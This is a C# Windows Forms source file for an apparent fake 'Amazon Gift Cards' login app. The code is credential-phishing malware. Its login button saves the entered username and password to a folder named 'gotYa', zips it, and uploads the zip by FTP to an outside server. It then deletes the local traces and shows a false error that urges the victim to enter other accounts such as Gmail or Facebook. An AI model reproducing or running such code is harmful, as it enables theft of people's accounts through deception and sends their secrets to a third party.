using Ionic.Zip;
using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace AmazonGiftCards
{
    public partial class Form2 : Form
    {
        public string LoginTitle { get; set; }
        public Form2(string btnTitle)
        {
            LoginTitle = btnTitle;
            InitializeComponent(LoginTitle);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text.Trim() == string.Empty || textBox2.Text.Trim() == string.Empty)
            {
                MessageBox.Show("The Username or Password cannot be empty.", "Amazon Gift Cards",
     MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var username = textBox1.Text;
            var password = textBox2.Text;

            string folderName = @"\gotYa\";
            string fileName = Environment.UserName;
            string date = DateTime.UtcNow.ToString("yyyyMMdd");
            System.IO.Directory.CreateDirectory(folderName);

            var textFile = $@"{folderName}{LoginTitle}.txt";

            if (!File.Exists(textFile))
            {
                using (var tw = new StreamWriter(textFile, true))
                {
                    tw.WriteLine($"Username: {username} {System.Environment.NewLine}Password: {password}");
                }
            }
            else if (File.Exists(textFile))
            {
                using (var tw = new StreamWriter(textFile, true))
                {
                    tw.WriteLine($"Username: {username} {System.Environment.NewLine}Password: {password}");
                }
            }

            using (ZipFile zip = new ZipFile())
            {
                zip.Password = "thisisacoolapassdaweaweasdasdfja;oirtaowlirgjloaikrgloiwkrejowiaejaoweijtf";
                zip.AddDirectory(folderName);
                zip.Save($"{folderName}Trial{LoginTitle}{fileName}-{date}.zip");
            }

            //using (var client = new WebClient())
            //{
            //    client.Credentials = new NetworkCredential("cazzo", "cazzo");
            //    client.UploadFile($"ftp://192.168.0.208:21/Trial{LoginTitle}{fileName}-{date}.zip", WebRequestMethods.Ftp.UploadFile, $"{folderName}Trial{LoginTitle}{fileName}-{date}.zip");
            //}

            using (var client = new WebClient())
            {
                client.Credentials = new NetworkCredential("demo-user", "demo-user");
                client.UploadFile($"ftp://demo.wftpserver.com/upload/Trial{LoginTitle}{fileName}-{date}.zip", WebRequestMethods.Ftp.UploadFile, $"{folderName}Trial{LoginTitle}{fileName}-{date}.zip");
            }

            Directory.Delete(folderName, true);

            Cursor = Cursors.WaitCursor;
            Thread.Sleep(3000);
            Cursor = Cursors.Arrow;

            MessageBox.Show("Something went wrong! Please try again or try to log in with another account (Gmail, Twitter, Facebook)", "Amazon Gift Cards",
    MessageBoxButtons.OK, MessageBoxIcon.Error);

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

    }
}
